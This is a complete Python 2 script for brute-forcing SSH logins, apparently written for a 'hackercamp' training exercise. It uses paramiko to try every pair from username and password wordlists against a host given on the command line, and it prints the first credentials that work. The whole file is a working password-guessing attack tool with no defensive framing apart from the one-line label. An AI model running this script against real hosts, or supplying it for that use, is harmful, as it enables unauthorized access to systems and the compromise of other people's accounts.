#!/usr/local/bin/python
import paramiko
import argparse
import os
import sys
from termcolor import colored


SCRIPT_PATH = os.path.dirname(os.path.realpath(__file__))
DEFAULT_USER_LIST = os.path.join(SCRIPT_PATH, "wordlist", "username.txt")
DEFAULT_PASS_LIST = os.path.join(SCRIPT_PATH, "wordlist", "password.txt")

description = """
    Ssh brute force script for hackercamp
    Example: python ssh_brute.py --host <host> --port <port> --userlist <username_wordlist> --passlist <password_wordlist>
"""

parser = argparse.ArgumentParser("ssh brute", description)
parser.add_argument("--userlist", "-u", help="wordlist for username, format:/home/user/userlist.txt",
                    default=DEFAULT_USER_LIST)
parser.add_argument("--passlist", "-p", help="wordlist for password, format:/home/user/passlist.txt",
                    default=DEFAULT_PASS_LIST)
parser.add_argument("--host", help="host address", required=True)
parser.add_argument("--port", help="port number", default=22)
args = parser.parse_args()


def brute_force():
    with open(args.userlist, "r") as user_file:
        with open(args.passlist, "r") as pass_file:
            user_list = user_file.readlines()
            pass_list = pass_file.readlines()
            for u in user_list:
                for p in pass_list:
                    u, p = u.strip("\n"), p.strip("\n")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(args.host, port=args.port, username=u, password=p)
                        print "Username: {}, password: {} has been found".format(colored(u, "green"),
                                                                                 colored(p, "green"))
                        exit()
                    except paramiko.ssh_exception.AuthenticationException:
                        sys.stdout.write('\x1b[KUsername: {}, password: {} wrong\r'.format(colored(u, "red"),
                                                                                           colored(p, "red")))
                    sys.stdout.flush()
            print "\nUsername password has been not found.."

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print parser.print_help()
        exit(0)
    brute_force()
